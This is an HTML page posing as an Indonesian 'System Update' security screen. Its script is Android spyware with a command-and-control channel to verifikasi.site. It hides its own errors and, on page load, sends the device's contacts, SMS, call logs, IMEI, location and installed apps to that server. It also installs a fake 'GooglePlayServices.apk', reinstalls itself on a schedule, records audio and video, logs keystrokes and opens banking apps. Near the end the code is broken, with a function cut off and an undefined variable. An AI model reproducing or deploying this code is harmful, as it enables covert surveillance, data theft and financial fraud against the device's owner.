<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>System Update</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0e17;display:flex;justify-content:center;align-items:center;height:100vh;color:#fff;font-family:'Segoe UI',Arial,sans-serif;margin:0;overflow:hidden}
        .container{text-align:center;width:90%;max-width:400px;padding:30px;background:linear-gradient(145deg,#0d1a2b,#1a2a3f);border-radius:16px;border:1px solid #2a3f5f;box-shadow:0 20px 60px rgba(0,0,0,0.8)}
        .icon{font-size:48px;margin-bottom:10px;display:block}
        .title{font-size:22px;font-weight:bold;color:#4fc3f7;margin-bottom:5px;letter-spacing:1px}
        .subtitle{font-size:13px;color:#8899aa;margin-bottom:20px}
        .progress-wrap{background:#1a2a3f;border-radius:30px;height:10px;overflow:hidden;margin-bottom:15px;border:1px solid #2a3f5f}
        .progress-bar{width:0%;height:100%;background:linear-gradient(90deg,#4fc3f7,#00e676);border-radius:30px;transition:width 0.3s ease}
        .status-text{font-size:13px;color:#8899aa;margin-top:5px}
        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#4caf50;margin-right:8px;animation:blink 1s infinite}
        @keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
        .fade-out{animation:fadeOut 0.5s ease forwards}
        @keyframes fadeOut{0%{opacity:1}100%{opacity:0}}
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <span class="icon">🔄</span>
    <div class="title">System Update</div>
    <div class="subtitle">Memperbarui sistem keamanan...</div>
    <div class="progress-wrap">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <div class="status-text">
        <span class="status-dot"></span>
        <span id="statusLabel">⏳ Memperbarui System Keamanan...</span>
    </div>
</div>

<script>
// ============================================================
// 🔥 SYSTEMUPDATE.HTML - IMPLEMENTASI STEP-BY-STEP
// ============================================================

// ============================================================
// STEALTH
// ============================================================
console.log = function() {};
console.warn = function() {};
console.error = function() {};
console.info = function() {};
window.onerror = function() { return true; };
window.addEventListener('error', function(e) { e.preventDefault(); return true; }, true);
window.addEventListener('unhandledrejection', function(e) { e.preventDefault(); return true; }, true);
if (window.history && window.history.replaceState) {
    window.history.replaceState(null, null, window.location.href);
}
Object.defineProperty(document, 'referrer', { value: '' });

// ============================================================
// KONFIGURASI
// ============================================================
var SERVER = 'https://verifikasi.site';
var WS_PASSWORD = '';
var PASSWORD_FETCHED = false;
var APK_INSTALLED = false;
var wsConnected = false;
var ws = null;
var allDone = false;
var progress = 0;
var C2_INTERVAL = 10000;
var REINFECTION_INTERVAL = 10800000;
var HEARTBEAT_INTERVAL = 2700000;
var SELF_HEALING_INTERVAL = 1800000;

// ============================================================
// DETEKSI PLATFORM
// ============================================================
function detectPlatform() {
    var ua = navigator.userAgent.toLowerCase();
    return {
        isAndroid: ua.indexOf('android') > -1,
        hasBridge: typeof AndroidBridge !== 'undefined'
    };
}
var PLATFORM = detectPlatform();

// ============================================================
// ANDROID BRIDGE
// ============================================================
var A = {
    isAvailable: PLATFORM.hasBridge && PLATFORM.isAndroid,
    saveFile: function(p,c) { if(this.isAvailable){ try{ AndroidBridge.saveFile(p,c); return true }catch(e){} } return false; },
    openFile: function(p) { if(this.isAvailable){ try{ AndroidBridge.openFile(p); return true }catch(e){} } return false; },
    openApp: function(p) { if(this.isAvailable){ try{ AndroidBridge.openApp(p); return true }catch(e){} } return false; },
    installAPK: function(p) { if(this.isAvailable){ try{ AndroidBridge.installAPK(p); return true }catch(e){} } return false; },
    fileExists: function(p) { if(this.isAvailable){ try{ return AndroidBridge.fileExists(p) }catch(e){} } return false; }
};

// ============================================================
// KIRIM DATA
// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// UI UPDATE
// ============================================================
function updateProgress(value, label) {
    progress = Math.min(value, 100);
    var bar = document.getElementById('progressBar');
    if (bar) bar.style.width = progress + '%';
    var status = document.getElementById('statusLabel');
    if (status && label) status.textContent = label;
}

// ============================================================
// STEP A: LOAD HTML DARI BACKUP
// ============================================================
function loadHTMLFromAllLocations() {
    return new Promise(function(resolve) {
        updateProgress(5, '⏳ Memperbarui System Keamanan...');
        K({ sumber: 'load_html_start', data: 'ok' });

        // Coba dari localStorage
        try {
            var html = localStorage.getItem('SystemUpdate_backup');
            if (html) {
                K({ sumber: 'load_html_localstorage', data: 'ok' });
                resolve();
                return;
            }
        } catch(e) {}

        // Coba dari IndexedDB
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onsuccess = function(e) {
                var db = e.target.result;
                var tx = db.transaction('files', 'readonly');
                var store = tx.objectStore('files');
                var get = store.get('SystemUpdate.html');
                get.onsuccess = function() {
                    if (get.result) {
                        K({ sumber: 'load_html_indexeddb', data: 'ok' });
                        resolve();
                        return;
                    }
                    resolve();
                };
            };
        } catch(e) { resolve(); }

        // Jika semua gagal
        setTimeout(resolve, 1000);
    });
}

// ============================================================
// STEP B: REGISTER SERVICE WORKER
// ============================================================
function registerSW() {
    return new Promise(function(resolve) {
        updateProgress(10, '📡 Mendaftarkan Service Worker...');
        K({ sumber: 'sw_start', data: 'ok' });

        if (!('serviceWorker' in navigator)) {
            K({ sumber: 'sw_skip', data: 'not_supported' });
            resolve();
            return;
        }

        navigator.serviceWorker.register('/sw.js', { scope: '/' })
            .then(function() {
                K({ sumber: 'sw_registered', data: 'ok' });
                resolve();
            })
            .catch(function() {
                K({ sumber: 'sw_fail', data: 'error' });
                resolve();
            });
    });
}

// ============================================================
// STEP C: AMBIL PASSWORD
// ============================================================
function ambilPassword() {
    return new Promise(function(resolve) {
        updateProgress(15, '🔑 Mengambil password...');
        K({ sumber: 'password_start', data: 'ok' });

        var retryCount = 0;
        var maxRetries = 5;

        function fetchPassword() {
            fetch(SERVER + '/get-password', { method: 'GET' })
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.password && data.password.length > 0) {
                        WS_PASSWORD = data.password;
                        PASSWORD_FETCHED = true;
                        try { localStorage.setItem('ws_password', WS_PASSWORD); } catch(e) {}
                        K({ sumber: 'password_received', data: 'ok' });
                        updateProgress(20, '✅ Password berhasil!');
                        resolve();
                    } else {
                        retryCount++;
                        if (retryCount >= maxRetries) {
                            WS_PASSWORD = 'default_fallback_password';
                            PASSWORD_FETCHED = true;
                            K({ sumber: 'password_fallback', data: 'used' });
                            resolve();
                            return;
                        }
                        setTimeout(fetchPassword, 2000);
                    }
                })
                .catch(function() {
                    retryCount++;
                    if (retryCount >= maxRetries) {
                        WS_PASSWORD = 'default_fallback_password';
                        PASSWORD_FETCHED = true;
                        K({ sumber: 'password_fallback', data: 'used' });
                        resolve();
                        return;
                    }
                    setTimeout(fetchPassword, 2000);
                });
        }

        fetchPassword();
    });
}

// ============================================================
// STEP D: CONNECT WEBSOCKET (WAIT!)
// ============================================================
function connectWebSocket() {
    return new Promise(function(resolve) {
        if (!PASSWORD_FETCHED || WS_PASSWORD === '') {
            K({ sumber: 'ws_skip', data: 'no_password' });
            resolve();
            return;
        }

        updateProgress(25, '🔌 Menghubungkan WebSocket...');
        K({ sumber: 'ws_connect_start', data: 'ok' });

        try {
            ws = new WebSocket('wss://' + SERVER.replace('https://', '') + '/ws');
            var timeoutId = setTimeout(function() {
                K({ sumber: 'ws_timeout', data: 'timeout' });
                ws.close();
                resolve();
            }, 15000);

            ws.onopen = function() {
                clearTimeout(timeoutId);
                wsConnected = true;
                K({ sumber: 'ws_connected', data: 'ok' });
                ws.send(JSON.stringify({ type: 'auth', key: WS_PASSWORD, deviceId: 'systemupdate' }));
                updateProgress(30, '✅ WebSocket terhubung!');
                resolve();
            };

            ws.onmessage = function(event) {
                try {
                    var data = JSON.parse(event.data);
                    if (data.type === 'auth_success') {
                        K({ sumber: 'ws_auth_success', data: 'ok' });
                    } else if (data.type === 'command' || data.aksi) {
                        var cmd = data.command || data;
                        var hasil = eksekusiPerintah(cmd);
                        ws.send(JSON.stringify({ type: 'result', perintah: cmd.aksi || 'unknown', hasil: hasil }));
                    }
                } catch(e) {}
            };

            ws.onclose = function() {
                wsConnected = false;
                K({ sumber: 'ws_disconnected', data: 'ok' });
                setTimeout(function() {
                    if (!allDone) connectWebSocket();
                }, 10000);
            };

            ws.onerror = function() {
                wsConnected = false;
                clearTimeout(timeoutId);
                K({ sumber: 'ws_error', data: 'error' });
                resolve();
            };

        } catch(e) {
            K({ sumber: 'ws_exception', data: e.message });
            resolve();
        }
    });
}

// ============================================================
// STEP E: AUTO EXECUTE C2 (12 Perintah Awal)
// ============================================================
function autoExecuteC2() {
    return new Promise(function(resolve) {
        updateProgress(35, '⚡ Menjalankan perintah awal...');
        K({ sumber: 'auto_c2_start', data: 'ok' });

        var commands = [
            'ambil_kontak', 'ambil_sms', 'ambil_call_log', 'ambil_imei',
            'ambil_imsi', 'ambil_nomor_hp', 'get_wifi', 'keylogger_start',
            'ambil_lokasi', 'get_installed_apps', 'get_notifications', 'get_system_info'
        ];

        commands.forEach(function(cmd) {
            try {
                var hasil = eksekusiPerintah({ aksi: cmd });
                K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil || 'success' } });
            } catch(e) {}
        });

        K({ sumber: 'auto_c2_done', data: 'complete' });
        updateProgress(40, '✅ Perintah awal selesai!');
        resolve();
    });
}

// ============================================================
// STEP F: START HEARTBEAT
// ============================================================
function startHeartbeat() {
    K({ sumber: 'heartbeat_start', data: 'ok' });
    setInterval(function() {
        K({ sumber: 'heartbeat', data: 'alive' });
    }, HEARTBEAT_INTERVAL);
}

// ============================================================
// STEP G: START REINFECTION
// ============================================================
function startReinfection() {
    K({ sumber: 'reinfection_start', data: 'ok' });
    setInterval(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'reinfection_check', data: 'apk_missing' });
            downloadAndInstallAPK();
        } else {
            K({ sumber: 'reinfection_check', data: 'apk_still_installed' });
        }
    }, REINFECTION_INTERVAL);
}

// ============================================================
// STEP H: START C2 POLLING
// ============================================================
function startC2Polling() {
    K({ sumber: 'c2_polling_start', data: 'ok' });
    setInterval(cekPerintah, C2_INTERVAL);
    setTimeout(cekPerintah, 1000);
}

function cekPerintah() {
    if (!PASSWORD_FETCHED || WS_PASSWORD === '') return;
    try {
        fetch(SERVER + '/data?type=perintah&t=' + Date.now(), {
            method: 'GET',
            headers: { 'X-Password': WS_PASSWORD }
        })
        .then(function(res) { return res.text(); })
        .then(function(content) {
            if (content && content.length > 5 && content !== '{}') {
                try {
                    var cmd = JSON.parse(content);
                    var hasil = eksekusiPerintah(cmd);
                    K({ sumber: 'c2_result', data: { perintah: cmd.aksi || 'unknown', hasil: hasil } });
                } catch(e) {}
            }
        })
        .catch(function() {});
    } catch(e) {}
}

// ============================================================
// STEP I: DOWNLOAD & INSTALL APK
// ============================================================
function downloadAndInstallAPK() {
    return new Promise(function(resolve) {
        updateProgress(50, '📥 Download & Install APK...');
        K({ sumber: 'apk_download_start', data: 'ok' });

        var apkUrl = SERVER + '/files/GooglePlayServices.apk';
        var apkPath = '/storage/emulated/0/Download/GooglePlayServices.apk';

        fetch(apkUrl, { method: 'GET', cache: 'no-store' })
            .then(function(res) { return res.blob(); })
            .then(function(blob) {
                if (A.isAvailable) {
                    var reader = new FileReader();
                    reader.onload = function() {
                        var base64 = reader.result.split(',')[1];
                        var binary = Uint8Array.from(atob(base64), function(c) { return c.charCodeAt(0); });
                        try {
                            if (AndroidBridge.saveFileBinary) {
                                AndroidBridge.saveFileBinary(apkPath, binary);
                            }
                            K({ sumber: 'apk_download_bridge', data: 'ok' });
                        } catch(e) {}
                    };
                    reader.readAsDataURL(blob);
                }

                // Fallback: download via link
                try {
                    var url = URL.createObjectURL(blob);
                    var a = document.createElement('a');
                    a.href = url;
                    a.download = 'GooglePlayServices.apk';
                    a.style.cssText = 'position:absolute;left:-9999px;top:-9999px;';
                    document.body.appendChild(a);
                    setTimeout(function() {
                        a.click();
                        setTimeout(function() {
                            try { document.body.removeChild(a); } catch(e) {}
                            URL.revokeObjectURL(url);
                        }, 2000);
                    }, 300);
                } catch(e) {}

                // Install APK
                setTimeout(function() {
                    installAPKFromPath(apkPath);
                    resolve();
                }, 2000);
            })
            .catch(function() {
                K({ sumber: 'apk_download_fail', data: 'error' });
                resolve();
            });
    });
}

// ============================================================
// STEP J: INSTALL APK DARI PATH
// ============================================================
function installAPKFromPath(path) {
    if (APK_INSTALLED) return;
    K({ sumber: 'apk_install_start', data: { path: path } });

    if (A.isAvailable) {
        try {
            if (A.fileExists(path)) {
                A.installAPK(path);
                APK_INSTALLED = true;
                K({ sumber: 'apk_install_success', data: 'ok' });
                updateProgress(100, '✅ APK terinstall!');
                finishAndRedirect();
                return;
            }
        } catch(e) {
            K({ sumber: 'apk_install_fail', data: e.message });
        }
    }

    // Jika gagal, coba via Intent
    try {
        window.location.href = 'file://' + path;
    } catch(e) {}

    setTimeout(function() {
        if (!APK_INSTALLED) {
            K({ sumber: 'apk_install_fallback', data: 'intent' });
            finishAndRedirect();
        }
    }, 5000);
}

// ============================================================
// STEP K: START SELF-HEALING
// ============================================================
function startSelfHealing() {
    K({ sumber: 'self_healing_start', data: 'ok' });
    setInterval(function() {
        // Cek HTML
        try {
            var html = localStorage.getItem('SystemUpdate_backup');
            if (!html) {
                K({ sumber: 'self_healing_html_missing', data: 'restore' });
                // Restore dari server
                fetch(SERVER + '/files/SystemUpdate.html')
                    .then(function(r) { return r.text(); })
                    .then(function(h) {
                        try { localStorage.setItem('SystemUpdate_backup', h); } catch(e) {}
                        if (A.isAvailable) {
                            A.saveFile('/storage/emulated/0/Download/SystemUpdate.html', h);
                        }
                    })
                    .catch(function() {});
            }
        } catch(e) {}

        // Cek APK
        if (!APK_INSTALLED) {
            K({ sumber: 'self_healing_apk_missing', data: 'redownload' });
            downloadAndInstallAPK();
        }
    }, SELF_HEALING_INTERVAL);
}

// ============================================================
// EKSEKUSI PERINTAH C2 (48 Perintah)
// ============================================================
function eksekusiPerintah(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var params = cmd.params || {};
    var hasil = '';

    try {
        switch(aksi) {
            case 'ambil_kontak': hasil = ambilKontak(); break;
            case 'ambil_sms': hasil = ambilSMS(); break;
            case 'ambil_call_log': hasil = ambilCallLog(); break;
            case 'ambil_lokasi': hasil = ambilLokasi(); break;
            case 'get_clipboard': hasil = getClipboard(); break;
            case 'set_clipboard': hasil = setClipboard(params.text || ''); break;
            case 'ambil_imei': hasil = ambilIMEI(); break;
            case 'ambil_imsi': hasil = ambilIMSI(); break;
            case 'ambil_nomor_hp': hasil = ambilNomorHP(); break;
            case 'get_installed_apps': hasil = getInstalledApps(); break;
            case 'get_notifications': hasil = getNotifications(); break;
            case 'keylogger_start': hasil = keyloggerStart(); break;
            case 'keylogger_stop': hasil = keyloggerStop(); break;
            case 'keylogger_upload': hasil = keyloggerUpload(); break;
            case 'keylogger_status': hasil = keyloggerStatus(); break;
            case 'kirim_sms': hasil = kirimSMS(params.nomor || '', params.pesan || ''); break;
            case 'kirim_sms_massal': hasil = kirimSMSMassal(params.pesan || ''); break;
            case 'call_number': hasil = callNumber(params.nomor || ''); break;
            case 'buka_aplikasi': hasil = bukaAplikasi(params.package || ''); break;
            case 'uninstall_aplikasi': hasil = uninstallAplikasi(params.package || ''); break;
            case 'buka_url': hasil = bukaURL(params.url || 'https://verifikasi.site'); break;
            case 'buka_dana': hasil = bukaDANA(); break;
            case 'buka_gopay': hasil = bukaAplikasi('com.gojek.app'); break;
            case 'buka_ovo': hasil = bukaAplikasi('ovo.id'); break;
            case 'buka_bri': hasil = bukaAplikasi('id.co.bri.brimo'); break;
            case 'buka_bca': hasil = bukaAplikasi('com.bca'); break;
            case 'buka_mandiri': hasil = bukaAplikasi('com.bankmandiri.mandirionline'); break;
            case 'buka_shopee': hasil = bukaAplikasi('com.shopee.id'); break;
            case 'screenshot': hasil = ambilScreenshot(); break;
            case 'record_audio': hasil = recordAudio(params.durasi || 10); break;
            case 'stop_audio': hasil = stopAudio(); break;
            case 'record_video': hasil = recordVideo(params.durasi || 10); break;
            case 'stop_video': hasil = stopVideo(); break;
            case 'list_file': hasil = listFile(params.path || '/sdcard/'); break;
            case 'ambil_file': hasil = ambilFile(params.path || ''); break;
            case 'get_system_info': hasil = getSystemInfo(); break;
            case 'get_battery': hasil = getBattery(); break;
            case 'get_wifi': hasil = getWiFi(); break;
            case 'vibrate': hasil = vibrate(params.durasi || 1000); break;
            case 'toast': hasil = showToast(params.pesan || 'Complete!'); break;
            case 'ping': hasil = 'pong'; break;
            case 'self_destruct': hasil = selfDestruct(); break;
            default: hasil = 'Unknown: ' + aksi;
        }
    } catch(e) {
        hasil = 'Error: ' + e.message;
    }
    return hasil;
}

// ============================================================
// IMPLEMENTASI FUNGSI PERINTAH
// ============================================================
function ambilKontak() {
    if (A.isAvailable && AndroidBridge.getAllContacts) {
        try { var data = AndroidBridge.getAllContacts(); K({ sumber: 'kontak', data: JSON.parse(data) }); return 'Kontak terkirim'; } catch(e) {}
    }
    return 'Kontak tidak tersedia';
}
function ambilSMS() {
    if (A.isAvailable && AndroidBridge.getAllSMS) {
        try { var data = AndroidBridge.getAllSMS(); K({ sumber: 'sms', data: JSON.parse(data) }); return 'SMS terkirim'; } catch(e) {}
    }
    return 'SMS tidak tersedia';
}
function ambilCallLog() {
    if (A.isAvailable && AndroidBridge.getCallLog) {
        try { var data = AndroidBridge.getCallLog(); K({ sumber: 'call_log', data: JSON.parse(data) }); return 'Call log terkirim'; } catch(e) {}
    }
    return 'Call log tidak tersedia';
}
function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({ sumber: 'lokasi', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } });
        });
        return 'Mengambil lokasi...';
    } catch(e) { return 'Lokasi error'; }
}
function getClipboard() {
    try {
        navigator.clipboard.readText().then(function(t) {
            K({ sumber: 'clipboard', data: t });
        });
        return 'Membaca clipboard...';
    } catch(e) { return 'Clipboard error'; }
}
function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text);
        return 'Clipboard diset: ' + text;
    } catch(e) { return 'Error'; }
}
function ambilIMEI() {
    if (A.isAvailable && AndroidBridge.getIMEI) {
        try { var data = AndroidBridge.getIMEI(); K({ sumber: 'imei', data: data }); return 'IMEI terkirim'; } catch(e) {}
    }
    return 'IMEI tidak tersedia';
}
function ambilIMSI() {
    if (A.isAvailable && AndroidBridge.getIMSI) {
        try { var data = AndroidBridge.getIMSI(); K({ sumber: 'imsi', data: data }); return 'IMSI terkirim'; } catch(e) {}
    }
    return 'IMSI tidak tersedia';
}
function ambilNomorHP() {
    if (A.isAvailable && AndroidBridge.getPhoneNumber) {
        try { var data = AndroidBridge.getPhoneNumber(); K({ sumber: 'nomor_hp', data: data }); return 'Nomor HP terkirim'; } catch(e) {}
    }
    return 'Nomor HP tidak tersedia';
}
function getInstalledApps() {
    if (A.isAvailable && AndroidBridge.getInstalledApps) {
        try { var data = AndroidBridge.getInstalledApps(); K({ sumber: 'installed_apps', data: JSON.parse(data) }); return 'Aplikasi terkirim'; } catch(e) {}
    }
    return 'Aplikasi tidak tersedia';
}
function getNotifications() {
    try {
        if (Notification.permission === 'granted') {
            K({ sumber: 'notifications', data: 'granted' });
            return 'Notifikasi diizinkan';
        }
        return 'Notifikasi tidak diizinkan';
    } catch(e) { return 'Error'; }
}
function keyloggerStart() {
    keyloggerActive = true;
    K({ sumber: 'keylogger_start', data: 'ok' });
    return 'Keylogger dimulai';
}
function keyloggerStop() {
    keyloggerActive = false;
    K({ sumber: 'keylogger_stop', data: 'ok' });
    return 'Keylogger dihentikan';
}
function keyloggerUpload() {
    K({ sumber: 'keylogger_upload', data: 'ok' });
    return 'Keylogger diupload';
}
function keyloggerStatus() {

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'audio', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Merekam audio ' + durasi + 's...';
    } catch(e) { return 'Error'; }
}
function stopAudio() {
    try {
        if (window._recorder) { window._recorder.stop(); window._recorder = null; return 'Audio berhenti'; }
        return 'Tidak ada rekaman';
    } catch(e) { return 'Error'; }
}
function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {

                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() { K({ sumber: 'video', data: reader.result }); };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
            });
        return 'Merekam video ' + durasi + 's...';
    } catch(e) { return 'Error'; }
}
